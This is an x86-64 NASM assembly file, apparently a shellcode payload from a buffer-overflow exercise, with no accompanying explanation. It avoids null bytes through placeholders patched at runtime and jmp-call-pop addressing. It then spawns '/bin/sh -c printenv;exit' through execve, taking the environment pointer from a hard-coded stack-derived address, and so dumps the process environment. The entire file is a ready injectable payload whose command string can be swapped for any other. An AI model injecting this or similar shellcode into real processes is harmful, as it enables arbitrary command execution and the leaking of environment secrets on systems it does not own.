            bits 64
; find out where we are
start:      jmp short codeEnd
start2:     pop rsi

; clear the A register
            xor rax,rax
; restore null bytes to data
            mov [byte rsi+flagStr-exeStr-2],al      ; move null byte to the end of /bin/sh    
            mov [byte rsi+cmdStr-exeStr-1],al       ; move null byte to the end of -c
            mov [byte rsi+arrayAddr-exeStr-1],al    ; move null byte to the end of shell command
            mov [byte rsi+arrayAddr-exeStr+24],rax  ; move null word to the end of array

; calculate runtime address of each label and store it in the array
            mov [byte rsi+arrayAddr-exeStr],rsi
            lea rdi, [byte rsi+flagStr-exeStr]
            mov [byte rsi+arrayAddr-exeStr+8],rdi
            lea rdi, [byte rsi+cmdStr-exeStr]
            mov [byte rsi+arrayAddr-exeStr+16],rdi

; execve system call
            mov al,0x3B
            mov rdi,rsi
            lea rsi,[byte rsi+arrayAddr-exeStr]
            mov rdx,rsp
            shr rdx,32
            shl rdx,32
            mov ecx,0xf7fbe6ff
            xor cl,cl
            or  rdx,rcx
            mov rdx,[rdx]
            syscall

            mov rdi,rax
            xor rax,rax
            mov al,0x3C
            syscall

codeEnd:    call start2
exeStr:     db "/bin/shXy"
flagStr:    db "-cX"
cmdStr:     db "printenv;exitX"
arrayAddr:  dq 0xffffffffffffffff
            dq 0xffffffffffffffff
            dq 0xffffffffffffffff
            dq 0xffffffffffffffff
newAddr:    dd newAddr-start